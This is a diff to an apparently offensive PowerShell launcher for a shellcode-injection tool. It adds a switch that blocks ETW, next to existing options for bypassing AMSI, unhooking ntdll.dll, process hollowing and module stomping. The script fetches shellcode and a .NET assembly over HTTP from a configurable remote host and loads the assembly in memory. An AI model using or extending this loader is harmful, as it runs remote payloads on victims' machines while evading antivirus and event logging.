@@ -82,11 +82,14 @@ $T = "True"
 # [/remoteAm51] bypass AMSI for remote process ("True" / "False" / "Force", used in "remotethreadkernelcb", "remotethreadapc", "remotethreadcontext", "processhollowing" and "modulestomping", "remotethreadkernelcb", "remotethreadapc", "remotethreadcontext", "processhollowing" and "modulestomping")
 $U = "True"
 
-# [/unhook] unhook ntdll.dll ("True" / "False")
+# [/etw] block ETW ("True" / "False", used in all techniques)
 $V = "False"
 
-# [/debug] print debug messages ("True" / "False")
+# [/unhook] unhook ntdll.dll ("True" / "False", all techniques)
 $W = "False"
+
+# [/debug] print debug messages ("True" / "False", all techniques)
+$X = "False"
 
 # --------------------------------------------------------------------
 
@@ -109,7 +112,7 @@ if ($methods.Contains($A)) {
     }
 }
 
-$cmd = "${A} /sc:http://${B}:${C}/${E} /p:${F} /protect:${G} /flipSleep:${H} /timeout:${I} /fluctuate:${J} /spoofStack:${K} /image:${L} /pid:${M} /ppid:${N} /dll:${O} /stompDll:${P} /stompExport:${Q} /sleep:${R} /blockDlls:${S} /am51:${T} /remoteAm51:${U} /unhook:${V} /debug:${W}"
+$cmd = "${A} /sc:http://${B}:${C}/${E} /p:${F} /protect:${G} /flipSleep:${H} /timeout:${I} /fluctuate:${J} /spoofStack:${K} /image:${L} /pid:${M} /ppid:${N} /dll:${O} /stompDll:${P} /stompExport:${Q} /sleep:${R} /blockDlls:${S} /am51:${T} /remoteAm51:${U} /etw:${V} /unhook:${W} /debug:${X}"
 
 $data = (IWR -UseBasicParsing "http://${B}:${C}/${D}").Content
 $assem = [System.Reflection.Assembly]::Load($data)
